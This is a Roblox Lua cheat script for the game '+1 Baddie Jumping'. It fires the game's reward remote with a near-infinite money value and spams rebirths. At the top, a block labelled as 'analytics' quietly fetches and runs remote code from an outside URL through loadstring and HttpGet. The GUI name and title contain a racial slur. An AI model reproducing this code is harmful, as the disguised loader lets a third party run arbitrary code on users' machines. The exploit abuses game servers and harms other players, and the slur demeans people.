--[[rscripts:analytics:start]]
-- Script analytics (enabled by the creator on rscripts.net).
-- Runs in its own thread and cannot affect the script below.
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6aa06f72bbc326101ec2aac7"))()
	end)
end)
--[[rscripts:analytics:end]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Player = Players.LocalPlayer

--==================================================
-- REMOTES
--==================================================

local GiveOutReward =
    ReplicatedStorage.Remotes.Roulette.GiveOutReward

local Rebirth =
    ReplicatedStorage.Events.Rebirth

--==================================================
-- SETTINGS
--==================================================

local AutoRebirth = false
local AutoMoney = false

local MoneyDelay = 0.01
local RebirthDelay = 0.01

--==================================================
-- GUI
--==================================================

local Gui = Instance.new("ScreenGui")
Gui.Name = "NiggerHub"
Gui.ResetOnSpawn = false

pcall(function()
    Gui.Parent = game:GetService("CoreGui")
end)

if not Gui.Parent then
    Gui.Parent = Player:WaitForChild("PlayerGui")
end

local Main = Instance.new("Frame")
Main.Size = UDim2.fromOffset(380, 280)
Main.Position = UDim2.new(0.5, -190, 0.5, -140)
Main.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Parent = Gui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = Main

local Stroke = Instance.new("UIStroke")
Stroke.Color = Color3.fromRGB(125, 85, 255)
Stroke.Thickness = 1.5
Stroke.Parent = Main

--==================================================
-- TITLE BAR
--==================================================

local Top = Instance.new("Frame")
Top.Size = UDim2.new(1, 0, 0, 45)
Top.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
Top.BorderSizePixel = 0
Top.Parent = Main

local Title = Instance.new("TextLabel")
Title.BackgroundTransparency = 1
Title.Position = UDim2.fromOffset(14, 0)
Title.Size = UDim2.new(1, -110, 1, 0)
Title.Text = "NiggerHub - +1 Baddie Jumping ✨"
Title.TextColor3 = Color3.fromRGB(240, 240, 255)
Title.TextSize = 16
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Top

--==================================================
-- MINIMIZE
--==================================================

local Minimize = Instance.new("TextButton")
Minimize.Size = UDim2.fromOffset(38, 38)
Minimize.Position = UDim2.new(1, -82, 0, 3)
Minimize.BackgroundTransparency = 1
Minimize.Text = "−"
Minimize.TextColor3 = Color3.fromRGB(220, 220, 230)
Minimize.TextSize = 22
Minimize.Font = Enum.Font.GothamBold
Minimize.AutoButtonColor = false
Minimize.Parent = Top

--==================================================
-- CLOSE
--==================================================

local Close = Instance.new("TextButton")
Close.Size = UDim2.fromOffset(38, 38)
Close.Position = UDim2.new(1, -42, 0, 3)
Close.BackgroundTransparency = 1
Close.Text = "×"
Close.TextColor3 = Color3.fromRGB(255, 90, 105)
Close.TextSize = 23
Close.Font = Enum.Font.GothamBold
Close.AutoButtonColor = false
Close.Parent = Top

--==================================================
-- CONTENT
--==================================================

local Content = Instance.new("Frame")
Content.Position = UDim2.fromOffset(12, 55)
Content.Size = UDim2.new(1, -24, 1, -65)
Content.BackgroundTransparency = 1
Content.Parent = Main

local Layout = Instance.new("UIListLayout")
Layout.Padding = UDim.new(0, 9)
Layout.SortOrder = Enum.SortOrder.LayoutOrder
Layout.Parent = Content

--==================================================
-- BUTTON
--==================================================

local function Button(text, callback)

    local B = Instance.new("TextButton")

    B.Size = UDim2.new(1, 0, 0, 45)
    B.BackgroundColor3 = Color3.fromRGB(30, 30, 41)
    B.BorderSizePixel = 0
    B.Text = text
    B.TextColor3 = Color3.fromRGB(235, 235, 245)
    B.TextSize = 14
    B.Font = Enum.Font.GothamMedium
    B.AutoButtonColor = false
    B.Parent = Content

    local C = Instance.new("UICorner")
    C.CornerRadius = UDim.new(0, 8)
    C.Parent = B

    B.MouseEnter:Connect(function()
        TweenService:Create(
            B,
            TweenInfo.new(0.12),
            {
                BackgroundColor3 = Color3.fromRGB(47, 42, 65)
            }
        ):Play()
    end)

    B.MouseLeave:Connect(function()
        TweenService:Create(
            B,
            TweenInfo.new(0.12),
            {
                BackgroundColor3 = Color3.fromRGB(30, 30, 41)
            }
        ):Play()
    end)

    B.MouseButton1Click:Connect(callback)

    return B
end

--==================================================
-- TOGGLE
--==================================================

local function Toggle(text, callback)

    local Enabled = false

    local B = Instance.new("TextButton")

    B.Size = UDim2.new(1, 0, 0, 45)
    B.BackgroundColor3 = Color3.fromRGB(30, 30, 41)
    B.BorderSizePixel = 0
    B.Text = ""
    B.AutoButtonColor = false
    B.Parent = Content

    local C = Instance.new("UICorner")
    C.CornerRadius = UDim.new(0, 8)
    C.Parent = B

    local Label = Instance.new("TextLabel")
    Label.BackgroundTransparency = 1
    Label.Position = UDim2.fromOffset(14, 0)
    Label.Size = UDim2.new(1, -90, 1, 0)
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(235, 235, 245)
    Label.TextSize = 14
    Label.Font = Enum.Font.GothamMedium
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = B

    local State = Instance.new("TextLabel")
    State.BackgroundTransparency = 1
    State.Position = UDim2.new(1, -70, 0, 0)
    State.Size = UDim2.fromOffset(60, 45)
    State.Text = "OFF"
    State.TextColor3 = Color3.fromRGB(150, 150, 160)
    State.TextSize = 13
    State.Font = Enum.Font.GothamBold
    State.Parent = B

    B.MouseButton1Click:Connect(function()

        Enabled = not Enabled

        if Enabled then
            State.Text = "ON"
            State.TextColor3 = Color3.fromRGB(100, 255, 160)
        else
            State.Text = "OFF"
            State.TextColor3 = Color3.fromRGB(150, 150, 160)
        end

        callback(Enabled)

    end)

    return B
end

--==================================================
-- MONEY
--==================================================

local function GiveMoney()

    GiveOutReward:FireServer({
        value = math.huge - 1,
        type = "Money",
        chance = 0.45
    })

end

--==================================================
-- REBIRTH
--==================================================

local function DoRebirth()

    Rebirth:FireServer()

end

--==================================================
-- FEATURES
--==================================================

Toggle("Auto Money", function(v)
    AutoMoney = v
end)

Toggle("Auto Rebirth", function(v)
    AutoRebirth = v
end)

Button("Give Money", function()
    GiveMoney()
end)

Button("Rebirth", function()
    DoRebirth()
end)

--==================================================
-- AUTO MONEY LOOP
--==================================================

task.spawn(function()

    while Gui.Parent do

        if AutoMoney then
            pcall(GiveMoney)
        end

        task.wait(MoneyDelay)

    end

end)

--==================================================
-- AUTO REBIRTH LOOP
--==================================================

task.spawn(function()

    while Gui.Parent do

        if AutoRebirth then
            pcall(DoRebirth)
        end

        task.wait(RebirthDelay)

    end

end)

--==================================================
-- DRAGGING
--==================================================

local Dragging = false
local DragStart
local StartPosition

Top.InputBegan:Connect(function(Input)

    if Input.UserInputType == Enum.UserInputType.MouseButton1
    or Input.UserInputType == Enum.UserInputType.Touch then

        Dragging = true
        DragStart = Input.Position
        StartPosition = Main.Position

        Input.Changed:Connect(function()

            if Input.UserInputState == Enum.UserInputState.End then
                Dragging = false
            end

        end)

    end

end)

UserInputService.InputChanged:Connect(function(Input)

    if not Dragging then
        return
    end

    if Input.UserInputType ~= Enum.UserInputType.MouseMovement
    and Input.UserInputType ~= Enum.UserInputType.Touch then
        return
    end

    local Delta = Input.Position - DragStart

    Main.Position = UDim2.new(
        StartPosition.X.Scale,
        StartPosition.X.Offset + Delta.X,
        StartPosition.Y.Scale,
        StartPosition.Y.Offset + Delta.Y
    )

end)

--==================================================
-- MINIMIZE
--==================================================

local Minimized = false

Minimize.MouseButton1Click:Connect(function()

    Minimized = not Minimized

    if Minimized then

        Minimize.Text = "+"

        Content.Visible = false

        TweenService:Create(
            Main,
            TweenInfo.new(0.2, Enum.EasingStyle.Quad),
            {
                Size = UDim2.fromOffset(380, 45)
            }
        ):Play()

    else

        Minimize.Text = "−"

        TweenService:Create(
            Main,
            TweenInfo.new(0.2, Enum.EasingStyle.Quad),
            {
                Size = UDim2.fromOffset(380, 280)
            }
        ):Play()

        task.delay(0.2, function()

            if Main.Parent and not Minimized then
                Content.Visible = true
            end

        end)

    end

end)

--==================================================
-- CLOSE
--==================================================

Close.MouseButton1Click:Connect(function()

    AutoMoney = false
    AutoRebirth = false

    local T = TweenService:Create(
        Main,
        TweenInfo.new(
            0.2,
            Enum.EasingStyle.Back,
            Enum.EasingDirection.In
        ),
        {
            Size = UDim2.fromOffset(0, 0)
        }
    )

    T:Play()

    T.Completed:Wait()

    Gui:Destroy()

end)

--==================================================
-- OPEN ANIMATION
--==================================================

Main.Size = UDim2.fromOffset(0, 0)

TweenService:Create(
    Main,
    TweenInfo.new(
        0.35,
        Enum.EasingStyle.Back,
        Enum.EasingDirection.Out
    ),
    {
        Size = UDim2.fromOffset(380, 280)
    }
):Play()
